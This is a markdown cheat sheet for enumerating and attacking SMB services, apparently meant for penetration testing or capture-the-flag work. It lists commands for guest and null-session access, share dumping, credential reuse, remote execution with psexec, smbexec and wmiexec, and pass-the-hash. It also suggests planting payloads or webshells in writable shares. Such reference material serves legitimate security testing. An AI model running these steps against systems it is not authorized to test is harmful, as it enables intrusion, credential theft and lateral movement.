# SMB Enumeration & Exploitation

## Purpose

This file provides a structured workflow for enumerating SMB services and extracting credentials, access, and lateral movement opportunities.

Core rules:

* SMB is a primary foothold vector
* Always try anonymous/guest access first
* Shares often contain credentials
* Always reuse credentials across services

---

## 0. Identify SMB

Common ports:

* 139 (NetBIOS)
* 445 (SMB)

Confirm:

```bash id="0gb0s3"
nmap -p 139,445 -sV <IP>
```

---

## 1. Anonymous / Guest Enumeration (FIRST STEP)

```bash id="zmbx07"
smbclient -L //<IP> -N
smbmap -H <IP>
enum4linux -a <IP>
```

### Guest account check

On many targets the guest account is enabled or anonymous binding succeeds with an empty password.
Both are common initial footholds and frequent misconfigurations:

```bash id="guest01"
netexec smb <IP> --local-auth -u guest -p '' --shares
# null-session alternative:
smbclient -L //<IP> -U guest%
```

Look for:

* accessible shares
* user listings
* domain info

---

## 2. Authenticated Enumeration

```bash id="9o1k2r"
smbclient -L //<IP> -U 'DOMAIN\user%pass'
smbmap -H <IP> -u user -p pass -d DOMAIN
netexec smb <IP> -u user -p pass -d DOMAIN
```

---

## 3. List and Access Shares

```bash id="n3t9c1"
smbclient //<IP>/share -U user
```

Inside:

```bash id="g6w4z8"
ls
get file
mget *
```

---

## 4. High-Value Shares

Always check:

* SYSVOL
* NETLOGON
* Users
* IT
* Backups
* Scripts
* Config
* Development

---

## 5. What to Look For (CRITICAL)

### Credentials

* passwords in files
* config files
* scripts
* .ini / .xml / .txt

### Sensitive Files

* backups
* database dumps
* deployment scripts

### Keys

* SSH keys
* API keys

### Scripts

* scheduled tasks
* login scripts

---

## 6. Writable Shares (HIGH IMPACT)

Check:

```bash id="i3f0q8"
smbmap -H <IP>
```

Look for:

* WRITE access

If writable:

* upload files
* plant payloads
* modify scripts

---

## 7. Credential Reuse

Test any found creds:

```bash id="n8y2v4"
netexec smb <targets.txt> -u user -p pass -d DOMAIN
```

Also test:

* WinRM
* RDP
* LDAP
* SSH

---

## 8. NetExec Deep Use

NetExec is the maintained community successor to CrackMapExec. Prefer `netexec`; `crackmapexec`
is retained as a legacy alias where already installed.

```bash id="netx01"
netexec smb <IP> --shares
netexec smb <IP> --users
netexec smb <IP> --sessions
netexec smb <IP> --local-auth
```

---

## 9. File Upload

```bash id="m6c9z2"
put file
```

Use for:

* payload delivery
* webshell placement
* privilege escalation

---

## 10. Remote Execution (With Credentials)

### psexec

```bash id="d2k8p5"
psexec.py DOMAIN/user:pass@<IP>
```

### smbexec

```bash id="z5w1r9"
smbexec.py DOMAIN/user:pass@<IP>
```

### wmiexec

```bash id="j0q4x7"
wmiexec.py DOMAIN/user:pass@<IP>
```

---

## 11. Pass-the-Hash

```bash id="p3c7v1"
psexec.py DOMAIN/user@<IP> -hashes <LM:NT>
```

---

## 12. Dumping Shares Recursively

```bash id="r7x1t4"
smbget -R smb://<IP>/share
```

---

## 13. Combine with Other Services

SMB feeds into:

* RPC → user enumeration
* LDAP → domain data
* Kerberos → roasting
* WinRM → shell access

---

## 14. Pivot Opportunities

Look for:

* internal scripts
* internal hostnames
* credentials for other systems
* domain relationships

---

## 15. If Anonymous Fails

Try:

* credentials
* password spraying
* RPC enumeration

---

## 16. If Stuck

RESET:

* re-check shares
* search for creds again
* re-test credentials
* combine with LDAP

---

## 17. Mental Model

* SMB = data + access
* Shares = treasure chests
* Credentials = keys

---

## 18. Golden Rules

* Always try anonymous/guest first
* Always scope downloads and preserve evidence
* Always reuse credentials across services
